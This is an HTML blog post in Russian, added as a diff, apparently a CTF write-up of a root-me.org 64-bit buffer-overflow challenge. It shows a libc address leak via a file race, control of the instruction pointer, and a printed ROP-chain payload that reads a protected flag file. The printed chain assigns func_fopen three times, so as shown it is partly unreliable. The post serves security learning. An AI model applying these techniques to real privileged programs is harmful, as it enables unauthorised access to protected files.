@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="../style.css" type="text/css">
+    <title></title>
+</head>
+
+<body>
+    <div class="centered">
+        <header id="header" class="header">
+            <div class="logo-wrapper">
+                <a href="../index.html" class="logo">Just interested guy</a>
+            </div>
+            <nav class="site-navbar">
+                <ul id="menu" class="menu">
+                <li class="menu-item">
+                <a class="menu-item-link" href="../index.html">Главная</a>
+                </li><li class="menu-item">
+                <a class="menu-item-link" href="../about/about.html">О себе</a>
+                </li>
+                </ul>
+            </nav>
+        </header>
+        <div class="main-content">
+            <article class="single">
+                <h1 class="post-title">Решение интересного задания на переполнение буфера с root-me.org</h1>
+                Исполняемый файл представляет собой 64-разрядный ELF. Описание задачи выглядит следующим образом: "Find a way to exploit this binary to read the flag in .passwd."
+                <br>
+                <br>
+                Для выполнения этого задания мне понадобилось изучить некоторые особенности работы функции malloc() в уязвимых версиях библиотеки libc, а также составить приличную цепочку ROP (return-oriented programming). 
+                <br>
+                Таким ненормальным программированием я еще не занимался).
+                <h3>Первые шаги</h3> 
+                Подключаемся по ssh к машине, на которой расположен исполняемый файл и проводим небольшую разведку.
+                <br>   
+                <br>
+                <img src="../images/bof_64/inv/intellegence.jpg" alt="">
+                <div class="image_desc"><i>Рис. 1. Разведка</i></div>
+                <br>
+                Доступ к файлу .passwd для нашего пользователя запрещен. Сама же программа имеет установленный бит SUID, а значит и доступ к содержимому файла. Также у нас есть доступ к исходникам, но я всегда сначала стараюсь решить задание не прибегая к ним. Тем более исполняемый файл собран с отладочной информацией, что значительно упрощает анализ.
+                <br>
+                Запустим программу и посмотрим, что она делает.
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/interface.jpg" alt="">
+                <div class="image_desc"><i>Рис. 2. Интерфейс программы</i></div>
+                <br>
+                Наиболее перспективными кажутся функции для отображения содержимого файла, однако при попытке просмотреть .passwd, используя пункты меню [2] и [5], получаем сообщения о том, что мы не являемся владельцем файла и доступ запрещен.
+                <br>
+                <br>
+                Попробуем в меню выбора ввести несколько некорректных значений. При вводе отрицательного числа нас ждет первый успех.
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/seg_fault.jpg" alt="">
+                <div class="image_desc"><i>Рис. 3. Ошибка при вводе отрицательного значения</i></div>
+                <br>
+                Для проведения анализа нам "из коробки" доступно большое количество утилит. Для начала воспользуемся radare2. Используя команду <span class="simbols">afl</span>, получим список функций.
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/func_list.jpg" alt="">
+                <div class="image_desc"><i>Рис. 4. Список функций</i></div>
+                <br>
+                Среди списка обнаружатся sym.display_shifted_file_content, sym.display_file_content, sym.make_choice (на скриншоте не видно), а также другие функции с говорящими названиями.
+                <br>
+                <br>    
+                Начнем с функции sym.make_choice, т.к. мы уже обнаружили в ней ошибку и нужно понять, что нам это дает. 
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/make_choice_1st_frag.jpg" alt="">
+                <div class="image_desc"><i>Рис. 5. Первый фрагмент функции make_choice()</i></div>
+                <br>
+                <img src="../images/bof_64/inv/make_choice_2nd_frag.jpg" alt="">
+                <div class="image_desc"><i>Рис. 6. Второй фрагмент функции make_choice()</i></div>
+                <br>
+                На фрагментах кода видно, что адреса функций, отвечающих за работу соответствующих пунктов меню помещаются в стэк. Введенное пользователем значение проходит некоторую фильтрацию (недостаточную, как мы уже знаем) и используется в качестве смещения до адреса нужной функции в стэке. Адрес помещается в регистр rax, а затем происходит вызов функции (<span class="simbols">call rax</span>). Таким образом, введя некорректное значение, мы можем произвольно (ну почти) считать со стэка некоторое значение и выполнить переход.
+                <br>
+                <br>
+                Теперь взглянем на функцию <span class="simbols">display_file_content</span>.
+                <br> 
+                Сначала в стэке резервируется место для локальных переменных и буфера, куда будет сохраняться содержимое запрашиваемого файла, а также осуществляется очистка буфера.
+                <br>
+                <br>
+                <img src="../images/bof_64/inv/disp_file_cont_0.jpg" alt="">
+                <div class="image_desc"><i>Рис. 6. Первый фрагмент функции display_file_content()</i></div>
+                <br>
+                Далее пользователя просят ввести имя файла. Содержимое файла (первые 0x10000 байт) считывается в буфер и осуществляется проверка имени файла. Именно в таком порядке. То есть, даже если просматривать файл нам нельзя, то его содержимое все равно сначала будет считано в стэк.
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/disp_file_cont_1.jpg" alt="">
+                <div class="image_desc"><i>Рис. 7. Второй фрагмент функции display_file_content()</i></div>
+                <br>
+                Теоретически можно запросить содержимое файла <span class="simbols">.passwd</span> и флаг будет помещен в стэк. На этом этапе я не придумал способа как это можно использовать. Тем не менее, с учетом того, что мы уже знаем про функцию make_choice, это дает нам возможность получить контроль на регистром <span class="simbols">rip</span>, тем самым изменить ход выполнения программы. Для этого мы можем создать файл, в который запишем произвольные 8 байт, далее вызвать функцию <span class="simbols">display_file_content</span> и указать на созданный файл. В результате мы поместим в стэк нужное значение, а после, используя баг в функции <span class="simbols">make_choice</span>, можем записать это значение в регистр <span class="simbols">rip</span>.
+                <br> 
+                <br>
+                Создадим файл.
+                <br>
+                <img src="../images/bof_64/inv/create_rand_file.jpg" alt="">
+                <div class="image_desc"><i>Рис. 8. Создание файла с произвольным содержимым</i></div>
+                <br>
+                Запустим отладчик и остановимся в функции <span class="simbols">display_file_content</span> в точке, где содержимое файла считывается в стэк.
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/read_file_cont.jpg" alt="">
+                <div class="image_desc"><i>Рис. 9. Чтение содержимого файла в буфер</i></div>
+                <br>
+                На момент вызова функции <span class="simbols">fgets</span> в регистре <span class="simbols">rdi</span> лежит адрес буфера, куда и помещается содержимое файла. Запомним это значение – 0x7ffdce993880.
+                <br> 
+                <br>
+                Далее остановимся в функции <span class="simbols">make_choice</span> в момент расчёта адреса стэка, где хранится указатель на вызываемую функцию (перед инструкцией <span class="simbols">call rax</span>).
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/call_addr_calc.jpg" alt="">
+                <div class="image_desc"><i>Рис. 10. Расчет адреса функции соответствующего пункта меню</i></div>
+                <br>
+                В регистре <span class="simbols">rax</span> лежит введенное пользователем число (в примере 2). Мы видим, что адрес, где должен храниться указатель на вызываемую функцию, рассчитывается по формуле:
+                <br>
+                <span class="simbols">func_pointer = rbp + entered_value * 8 - 0x40</span>
+                <br>
+                Значение регистра <span class="simbols">rbp = 0x7ffdce9a38f0</span>
+                <br>
+                Зная  адрес, по которому лежит содержимое файла (мы запоминали это значение - 0x7ffdce993880), можно рассчитать, какое число нам нужно ввести, чтобы после выполнения инструкции <span class="simbols">mov</span> в регистре <span class="simbols">rax</span> оказалось нужное нам значение.
+                <br>
+                <span class="simbols">0x7ffdce993880 = 0x7ffdce9a38f0 + n*8 – 0x40</span>
+                <br>
+                Отсюда, n = -8198
+                <br>
+                Пробуем.
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/pwn_rip.jpg" alt="">
+                <div class="image_desc"><i>Рис. 11. Получаем возможность изменить ход выполнения программы</i></div>
+                <br>
+                Отлично, мы можем выполнить переход на любой заданный адрес. Теперь нужно каким-то образом обойти ограничения на чтение файла. Тут надо признаться у меня не было конкретного плана, что делать дальше. Точнее была мысль, что можно составить цепочку ROP, для вызова shell'а, но для этого нужно обойти ASLR, а также найти способ контроллировать стэк (ну или поискать другой вектор атаки). 
+                <br>
+                <h3>Обходим ASLR</h3>
+                Вообще можно воспользоваться 4-м пунктом меню и просмотреть директорию <span class="simbols">/proc/self/map_files</span>. Так можно сразу получить "карту" памяти.  
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/memory_map.jpg" alt="">
+                <div class="image_desc"><i>Рис. 12. Memory map</i></div>
+                <br>
+                В этом плане задание меня несколько расстроило. Я решил поискать другой способ обойти ASLR или хотя бы получить адрес библиотеки libc.
+                <br>
+                На этот раз мое внимание привлекла функция <span class="simbols">display_shifted_file_content</span>.
+                <br>
+                Листинг функции достаточно большой. Потому приведу список вызовов внутри функции.
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/display_shifted_file_content_0.jpg" alt="">
+                <div class="image_desc"><i>Рис. 13. Список вызовов внутри функции display_shifted_file_content</i></div>
+                <br>
+                <ul>Кратко алгоритм можно описать так:
+                <li>У пользователя запрашивается имя файла, содержимое которого требуется отобразить;</li>
+                <li>Выделяется необходимый объем памяти;</li>
+                <li>У пользователя запрашивается значение, которое будет прибавляться к каждому байту содержимого файла;</li>
+                <li>Выполняются «проверки безопасности»</li>
+                <li>Содержимое файла (по размеру выделенной памяти) считывается в буфер</li>
+                </ul>
+                Снова можно заметить недостаток в таком алгоритме. Между выделением буфера и чтением файла программа ожидает пользовательского ввода. В этот момент размер файла, как и сам файл можно изменить. Попробуем это как-то использовать.
+                <br>
+                В материалах задания есть фрагмент, описывающий структуру блока памяти, выделяемого функцией <span class="simbols">malloc()</span> (описание справедливо для определенных версий библиотеки).
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/malloc_struct_desc.jpg" alt="">
+                <div class="image_desc"><i>Рис. 14. Описание струкруры чанка памяти, выделяемого функцией malloc()</i></div>
+                <br>
+                Мое внимание привлек тот факт, что функция <span class="simbols">malloc()</span> возвращает адрес, который указывает на поле fd и после освобождения блока памяти по этому адресу будет находиться двусвязный список свободных чанков.
+                <br>
+                Попробуем выделить несколько блоков памяти и посмотреть, какие адреса сохранятся после освобождения памяти. Для этого установим брейкпоинт в функции <span class="simbols">display_shifted_file_content</span> на инструкции освобождения памяти.
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/chunk_after_free_0.jpg" alt="">
+                <div class="image_desc"><i>Рис. 15. Дамп памяти после освобождения первого чанка</i></div>
+                <br>
+                <img src="../images/bof_64/inv/chunk_after_free_1.jpg" alt="">
+                <div class="image_desc"><i>Рис. 16. Дамп памяти после освобождения второго чанка</i></div>
+                <br>
+                Первый чанк функция malloc() выделила по адресу <span class="simbols">0x556f7196ca60</span>. После освобождения, первые 8 байт "обнулились". Однако после освобождения 2-го чанка в первых 16 байтах сохранились 2 указателя. При этом адрес (в примере - <span class="simbols">0x00007f0624259bb8</span>) принадлежит одной из секций библиотеки libc. Секции имеют фиксированное смещение относительно базового адреса, значит мы можем вычислить это смещение для нашего случая и использовать его в будущем. Проверим текущий адрес библиотеки.
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/libc_sections.jpg" alt="">
+                <div class="image_desc"><i>Рис. 17. Адрес библиотеки libc</i></div>
+                <br>
+                Видим, что базовый адрес библиотеки libc равен <span class="simbols">0x00007f0623e95000</span>. Теперь мы можем рассчитать смещение до нужной секции (точнее до нужной страницы памяти), по следующей формуле:
+                <br>
+                <br>
+                <span class="simbols">offset = (leaked_address &amp; 0xFFFFFFFFFFFFF000) - libc_base_address</span>
+                <br>
+                <i>Младшие 12 бит обнуляем, т.к. страницы памяти выровнены по 4кб границе.</i>
+                <br>
+                <br>
+                Тогда,
+                <br>
+                <br>
+                <span class="simbols">offset = 0x00007f0624259000 - 0x00007f0623e95000 = 0x3C4000</span>
+                <br>
+                <br>
+                Запустив программу несколько раз, удеждаемся, что смещение фиксировано.
+                <br>
+                <br>
+                Получается, если мы сможем добиться “утечки” адреса, мы сможем рассчитать базовый адрес библиотеки libc. С учетом того, что мы уже знаем, добиться этого должно быть несложно. План такой:
+                <br>
+                <ul>
+                    <li>Создать 2 файла размерами 0x16 и 0x28 байт (чтобы программа выделила 2 разных блока памяти);</li>
+                    <li>Запустить программу, дважды вызвать пункт меню [5], и прочитать по очереди оба файла;</li>
+                    <li>Вызвать пункт меню [5] в третий раз, однако теперь, когда пользователю предложат ввести значение, которое будет прибавляться к каждому байту содержимого файла, нужно уменьшить размер файла до 8 и меньше байт. Так как в выделенном блоке памяти первые 16 байт будут хранить указатели на список свободных блоков памяти, то содержимое файла размером менее 8 байт, не затрет указатель и при выводе содержимого, произойдет утечка.</li>
+                </ul>
+                Для проверки запустим приложение в фоновом режиме, а взаимодействие будем осуществлять через именованный канал (пайп).
+                <br>
+                Используя команду
+                <br>
+                <span class="simbols">mkfifo /dev/shm/challenge/fifo </span>
+                <br>
+                создадим пайп, а команду
+                <br>
+                <span class="simbols">./ch6 &lt;&gt; /dev/shm/challenge/fifo &amp; </span>
+                <br>
+                запустим приложение в фоновом режиме.
+                <br>
+                <br>
+                    Для взаимодействия можно использовать команду <span class="simbols">echo</span>. Например, чтобы вызвать пункт меню [6], нужно ввести:
+                <br>
+                    <span class="simbols">echo -n -e "6\n" &gt; /dev/shm/challenge/fifo</span>
+                <br>
+                Таким образом получим возможность изменить содержимое (и размер) файла в нужный момент времени.
+                <br> 
+                <br>        
+                <img src="../images/bof_64/inv/leakage.jpg" alt="">
+                <div class="image_desc"><i>Рис. 18. Утечка адреса</i></div>
+                <br>
+                Такой вывод не очень информативен (непечатные символы не отображаются), но главное - удалось добиться утечки адреса. Теперь для удобства (и в последующем для автоматизации) можно воспользоваться модулем <span class="simbols">pwntool</span> для python.
+                <br>
+                Тот же результат с использованием pwntools
+                <br> 
+                <br>        
+                <img src="../images/bof_64/inv/leakage_pwntool.jpg" alt="">
+                <div class="image_desc"><i>Рис. 19. Утечка адреса (pwntool)</i></div>
+                <br>
+                Итак, на данный момент мы можем заставить программу перейти на заданный адрес и можем получить адрес библиотеки libc, а значит мы можем вызвать любую функцию библиотеки. Но пока есть 2 существенных ограничения - нет возможности передать произвольные аргументы функции и нет контроля над ходом выполнения программы. Чтобы обойти эти ограничения (и составить цепочку ROP для получения шела или вывода содержимого файла) необходимо получить контроль над стэком. Частичный контроль стэка у нас есть (благодаря функции <span class="simbols">display_file_content()</span>), но не в том кадре, где мы можем выполнить переход на заданный адрес. Нужно найти способ переписать нужный кадр стэка или поискать другой вектор атаки.
+                <br>
+                <br>
+                
+                <h3>Финишная прямая</h3>
+                После некоторого времени проведенного за отладкой, я обратил внимание на одну любопытную деталь в функции <span class="simbols">make_choice()</span>. Еще раз взгрянем на состояние регистров в момент вызова выбранного пункта меню.
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/call_addr_calc.jpg" alt="">
+                <div class="image_desc"><i>Рис. 20. Расчет адреса функции соответствующего пункта меню (снова)</i></div>
+                <br> 
+                У вызываемых функций нет аргументов, а в регистре <span class="simbols">rdi</span> (через который обычно передается первый аргумент) содержится адрес, который  находится в пределах текущего кадра стэка. То есть если мы выполним переход на какую-нибудь функцию из библиотеки libc, то первым аргументом будет передан этот адрес. Так ведь есть замечательная функция gets! Она практически идеально нам подходит - принимает всего 1 аргумент и этот аргемент является адресом буфера, в который будет помещены данные введенные пользователем! А значит, направив выполнение на эту функцию, мы запишем в стэк все, что введем (есть конечно небольшое ограничение, т.к. функция завершает прием данных при получении символа ‘\n’). Это позволит нам вызвать переполнение стэка, переписать адрес возврата и составить цепочку ROP.
+                <br> 
+                <br> 
+                Для начала в отладчике выполним переход на функцию gets и введем специально сгенерированный шаблон для определения смещения до адреса возврата. Есть много способов создания такого шаблона, я воспользуюсь <a href="https://wiremask.eu/tools/buffer-overflow-pattern-generator/">online генератором</a>.
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/ret_addr_offset.jpg" alt="">
+                <div class="image_desc"><i>Рис. 21. Использование шаблона для подбора смещения до адреса возврата</i></div>
+                <br>
+                <img src="../images/bof_64/inv/generate_pattern.jpg" alt="">
+                <div class="image_desc"><i>Рис. 22. Онлайн генератор шаблона</i></div>
+                <br> 
+                Видим, что смещение в стэке до адреса возврата равно 19. Отлично. Теперь можно переходить к составлению цепочки ROP.
+                <br>
+                Первое, что я попробовал сделать это составить цепочку для получения шелла. Вызвать /bin/bash у меня получилось, однако доступа к содержимому файла <span class="simbols">.passwd</span>, все равно не было, не смотря на бит SUID.
+                <br>
+                Ну что ж, займемся ненормальным программированием. Используя ROP, напишем программу, которая открывает файл <span class="simbols">.passwd</span>, читает его содержимое и выводит на экран.
+                <br>
+                Для начала запустим утилиту ROPgadget и посмотрим какие "инструкции" ROP мы можем найти в библиотеке libc.
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/rop_gadget_chain.jpg" alt="">
+                <div class="image_desc"><i>Рис. 23. Результат работы ROPgadget</i></div>
+                <br>
+                Как видно, библиотека libc дает нам огромные возможности по обратно-ориентированному программированию! Мы можем записывать значение регистра по произвольному адресу, инициализировать аргументы и выполнять системные вызовы.
+                <br>
+                <br>     
+                Для чтения файла и вывода его содержимого на экран нам нужны функции <span class="simbols">fopen, fgets и puts</span>. Узнать адрес нужной функции можно, используя команду:
+                <br> 
+                <span class="simbols">readelf -s ./lib/libc.so.6 | grep fopen</span>  
+                <br> 
+                <br>
+                <img src="../images/bof_64/inv/readelf_fopen.jpg" alt="">
+                <div class="image_desc"><i>Рис. 24. Поиск смещения до функции fopen</i></div>
+                <br>
+                После того как все адреса нужных функций и ROP-инструкций получены, можно приступать непосредственно к программированию. В результате у меня получился такой код:
+                <pre>
+                    <code>
+<span class="code-comment">#------------ generate rop chain----------</span>
+padding = <span class="code-string">b'\x41'</span>*<span class="code-number">19</span> <span class="code-comment"># offset to ret address = 19</span>
+zero = <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, <span class="code-number">0</span>)
+func_exit = <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x03a030</span>)    
+func_fopen = <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x06dd70</span>) 
+func_fopen = <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x06dad0</span>)    
+func_fopen =  <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x06f690</span>)
+ 
+p = <span class="code-string">b''</span>
+p += padding
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x0000000000001b92</span>) <span class="code-comment"># pop rdx ; ret</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x00000000003c4080</span>) <span class="code-comment"># @ .data // file_name</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x0000000000033544</span>) <span class="code-comment"># pop rax ; ret</span>
+p += <span class="code-string">b'.passwd\x00'</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x000000000002e19c</span>) <span class="code-comment"># mov qword ptr [rdx], rax ; ret</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x0000000000001b92</span>) <span class="code-comment"># pop rdx ; ret</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x00000000003c4088</span>) <span class="code-comment"># @ .data + 8 // mode</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x0000000000033544</span>) <span class="code-comment"># pop rax ; ret</span>
+p += <span class="code-string">b'r\x00\x00\x00\x00\x00\x00\x00'</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x000000000002e19c</span>) <span class="code-comment"># mov qword ptr [rdx], rax ; ret</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x00000000000202e8</span>) <span class="code-comment"># pop rsi ; ret</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x00000000003c4088</span>) <span class="code-comment"># @ .data + 8 // &quot;r&quot;</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x0000000000001b92</span>) <span class="code-comment"># pop rdx ; ret</span>
+p += zero
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x0000000000021102</span>) <span class="code-comment"># pop rdi ; ret</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x00000000003c4080</span>) <span class="code-comment"># @ .data  = &quot;.passwd&quot;</span>
+p += func_fopen
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x0000000000001b92</span>) <span class="code-comment"># pop rdx ; ret</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x00000000003c4090</span>) <span class="code-comment"># @ .data + 16 // handle</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x000000000002e19c</span>) <span class="code-comment"># mov qword ptr [rdx], rax ; ret</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x00000000000202e8</span>) <span class="code-comment"># pop rsi ; ret</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x00000000003c4090</span>) <span class="code-comment"># @ .data + 16 // handle</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x0000000000021102</span>) <span class="code-comment"># pop rdi ; ret</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x00000000003c4090</span>) <span class="code-comment"># @ .data + 16 // handle</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x00000000000a5da0</span>) <span class="code-comment"># mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x00000000000202e8</span>) <span class="code-comment"># pop rsi ; ret</span>
+p += <span class="code-string">b'\x50\x00\x00\x00\x00\x00\x00\x00'</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x0000000000021102</span>) <span class="code-comment"># pop rdi ; ret</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x00000000003c40a0</span>) <span class="code-comment"># @ .data + 32 // dest_buffer</span>
+p += func_fopen
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x00000000000202e8</span>) <span class="code-comment"># pop rsi ; ret</span>
+p += zero
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x0000000000021102</span>) <span class="code-comment"># pop rdi ; ret</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x00000000003c40a0</span>) <span class="code-comment"># @ .data + 32 // buffer</span>
+p += <span class="code-keyword">struct.pack</span>(<span class="code-string">&quot;&lt;Q&quot;</span>, libcBase + <span class="code-number">0x0000000000001b92</span>) <span class="code-comment"># pop rdx ; ret</span>
+p += zero
+p += func_fopen
+p += func_exit
+p += <span class="code-string">b'\n\x00\x00\x00\x00\x00\x00\x00'</span>
+                    </code>
+                </pre>
+            Этот фрагмент кода формирует payload, который нужно передать функции gets.
+            И да, заниматься отладкой ROP кода, то еще удовольствие) Как бы то ни было, код работает и успешно считывает и выводит содержимое файла <span class="simbols">.passwd</span>. 
+            <br>
+            <h3>Итог</h3>
+            Итак, в ходе выполнения задания:
+            <ul>
+                <li>Обнаружен баг в функции <span class="simbols">make_choice()</span>, позволяющий направить ход выполнения программы на произвольный адрес;</li>
+                <li>Недостаток в алгоритме функции <span class="simbols">display_file_content</span>, который заключается в том, что содержимое защищаемого файла считывается в буфер ПЕРЕД проверками разрешений;</li>
+                <li>Недостаток в алгоритме функции <span class="simbols">display_shifted_file_content</span>,  из-за которого в промежутке между выделением памяти и чтением содержимого файла, у пользователя есть возможность изменить его содержимое и размер;</li>
+                <li>Недостаток в алгоритме функции <span class="simbols">malloc</span>, который при определенных обстоятельствах может привести к утечке адреса (а также к heap overflow);</li>
+            </ul>  
+            В результате найденные уязвимости позволили выполнить произвольный код и получить содержимое защищаемого файла.
+            <br>
+            Модуль <span class="simbols">pwntool</span> для python позволяет полность автоматизировать процесс эксплуатации. В итоге получился <a href="misc/result.py">такой скрипт</a>.
+            <br>
+            И результат его работы:
+            <br> 
+                <br>
+                <img src="../images/bof_64/inv/result.jpg" alt="">
+                <div class="image_desc"><i>Рис. 25. Результат</i></div>
+                <br>
+            </article>
+        </div>
+    </div>    
+</body>
+</html>
